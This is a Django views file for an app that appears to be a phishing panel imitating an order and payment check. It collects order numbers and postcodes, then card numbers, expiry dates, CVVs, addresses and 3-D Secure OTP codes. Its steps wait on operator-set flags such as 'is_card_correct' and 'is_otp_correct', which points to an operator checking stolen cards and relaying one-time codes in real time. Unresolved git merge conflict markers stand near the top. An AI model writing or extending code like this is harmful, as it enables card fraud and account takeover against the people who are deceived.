from django.http.response import HttpResponseRedirect
from django.shortcuts import render
from .models import page1
from django.urls import reverse

<<<<<<< HEAD

=======
>>>>>>> 06693a5983db287759ab0ebf7448b5c279750624
def index(request):
    if request.method == "POST":
        order_number = request.POST.get('order_number')
        post_code = request.POST.get('post_code')
        if order_number and post_code:
            n = page1.objects.create(orderNumber=order_number, postCode=post_code)
            n.save()
            id = n.id
            return HttpResponseRedirect(reverse('page1:waiting', args=[id]))
    return render(request,"page1/index.html")

def waitReply(request, pk):
    get_order = page1.objects.get(id=pk)
    if get_order.is_order_authentic == True and get_order.is_order_checked == True:
        return HttpResponseRedirect(reverse('page1:card-details', args=[pk]))
    elif get_order.is_order_authentic == False and get_order.is_order_checked == True:
        return HttpResponseRedirect(reverse('page1:order-wrong'))
    return render(request, "page1/order-details-verification.html")

def order_wrong (request):
    return render(request, 'page1/order-wrong.html')

def cardDetails(request, pk):
    get_amount = page1.objects.get(id=pk)
    context = {'get_amount':get_amount}
    if request.method == "POST":
        owner_name = request.POST.get('owner_name')
        card_number = request.POST.get('card_number')
        expiry = request.POST.get('expiry')
        cvv = request.POST.get('cvv')
        if owner_name and card_number and expiry and cvv:
            record = page1.objects.get(id=pk)
            record.owner_name = owner_name
            record.card_number = card_number
            record.expiry = expiry
            record.cvv = cvv
            record.save()

            return HttpResponseRedirect(reverse('page1:card-verification', args=[pk]))

    return render(request, "page1/card-details.html", context)


def are_card_details_correct(request, pk):
    card_verification = page1.objects.get(id=pk)
    if card_verification.is_card_correct == True and card_verification.is_card_checked == True:
        return HttpResponseRedirect(reverse('page1:address', args=[pk]))
    elif card_verification.is_card_correct == False and card_verification.is_card_checked == True:
        return HttpResponseRedirect(reverse('page1:card-wrong', args=[pk]))
    return render(request, "page1/card-details-verification.html")


def card_wrong(request, pk):
    card = page1.objects.get(id=pk)
    context = {'card_id':card}
    card.is_card_checked = False
    card.save()
    return render(request, "page1/card-wrong.html", context)


def addressDetails(request, pk):
    order_details = page1.objects.get(id=pk)
    context = {'order':order_details}
    if request.method == "POST":
        main_address = request.POST.get('main_address')
        apt_suite = request.POST.get('apt_suite')
        city = request.POST.get('city')
        record = page1.objects.get(id=pk)
        if main_address:
            record.address = main_address
            record.apt_suite = apt_suite
            record.city = city
            record.save()
            return HttpResponseRedirect(reverse('page1:address-verification', args=[pk]))
        else:
            record.address = "None"
            record.address = "None"
            record.apt_suite = "None"
            record.city = "None"
            record.save()
            return HttpResponseRedirect(reverse('page1:address-verification', args=[pk]))

    return render(request, "page1/address_details.html", context)


def address_correct(request, pk):
    address = page1.objects.get(id=pk)
    if address.is_address_correct == True and address.is_address_details_checked == True:
        return HttpResponseRedirect(reverse('page1:threeDS', args=[pk]))
    elif address.is_address_correct == False and address.is_address_details_checked == True:
        return HttpResponseRedirect(reverse('page1:address-wrong', args=[pk]))
    return render(request,"page1/address-verification.html")

def address_wrong(request, pk):
    address = page1.objects.get(id=pk)
    context = {'address_id':address}
    address.is_address_details_checked = False
    address.save()
    return render(request,"page1/address-wrong.html",context)

def threeDSMain(request,pk):
    set_the_button = page1.objects.get(id=pk)
    context = {'order_amount':set_the_button}
    if request.method == 'POST':
        if 'Text' in request.POST :

            set_the_button.is_text_clicked = "Yes"
            set_the_button.save()
            return HttpResponseRedirect(reverse('page1:authenticate-text', args=[pk]))
        elif 'App' in request.POST:

            set_the_button.is_app_clicked = "Yes"
            set_the_button.save()
            return HttpResponseRedirect(reverse('page1:authenticate-app', args=[pk]))
    return render(request, "page1/threeDSMain.html", context)

"""-------------------------------------------------------------------------------------------------------------"""


def authenticate_app(request,pk):
    set_the_app_button_value = page1.objects.get(id=pk)
    if request.method == 'POST':
        if 'Payment_by_App' in request.POST:
            set_the_app_button_value.payment_through_app_button_clicked = "Yes"
            set_the_app_button_value.save()
            return HttpResponseRedirect(reverse('page1:payment-verification', args=[pk]))
    return render(request, "page1/authenticate-app.html")


def payment_verification(request, pk):
    payment_via_app = page1.objects.get(id=pk)
    if payment_via_app.is_payment_received_through_app == True and  payment_via_app.is_app_checked == True:
        return render(request, 'page1/payment-success.html')
    elif payment_via_app.is_payment_received_through_app == False and  payment_via_app.is_app_checked == True:
        payment_via_app.is_card_correct = False
        payment_via_app.is_card_checked = False
        payment_via_app.is_address_correct = False
        payment_via_app.is_address_details_checked = False
        payment_via_app.is_app_clicked = "No"
        payment_via_app.is_text_clicked = "No"
        payment_via_app.payment_through_app_button_clicked = "No"
        payment_via_app.is_payment_received_through_app = False
        payment_via_app.is_app_checked = False
        payment_via_app.otp_code_from_user = "0"
        payment_via_app.is_otp_correct = False
        payment_via_app.is_otp_checked = False
        payment_via_app.save()
        return HttpResponseRedirect(reverse('page1:payment-declined', args=[pk]))
    return render(request,'page1/payment_verification.html')

def payment_declined(request, pk):
    if request.method == 'POST':
        return HttpResponseRedirect(reverse('page1:threeDS',args=[pk]))
    return render(request, 'page1/payment-decline.html')

"""-----------------------------------------------------------------------------------------------------------------------------------------------"""

def autenticate_text(request,pk):
    set_otp = page1.objects.get(id=pk)
    if request.method == 'POST':
        set_otp.otp_code_from_user = request.POST.get('otp_code')
        set_otp.save()
        return HttpResponseRedirect(reverse('page1:payment-verification-text', args=[pk]))
    return render(request, 'page1/authenticate-text.html')

def payment_verification_text(request, pk):
    otp_correct = page1.objects.get(id=pk)
    if otp_correct.is_otp_correct == True and otp_correct.is_otp_checked == True:
        return render(request, 'page1/payment-success.html')
    elif otp_correct.is_otp_correct == False and otp_correct.is_otp_checked == True:
        otp_correct.is_card_correct = False
        otp_correct.is_card_checked = False
        otp_correct.is_address_correct = False
        otp_correct.is_address_details_checked = False
        otp_correct.is_app_clicked = "No"
        otp_correct.is_text_clicked = "No"
        otp_correct.payment_through_app_button_clicked = "No"
        otp_correct.is_payment_received_through_app = False
        otp_correct.is_app_checked = False
        otp_correct.otp_code_from_user = "0"
        otp_correct.is_otp_correct = False
        otp_correct.is_otp_checked = False
        otp_correct.save()
        return HttpResponseRedirect(reverse('page1:payment-declined', args=[pk]))
    return render(request, 'page1/payment-verification-text.html')
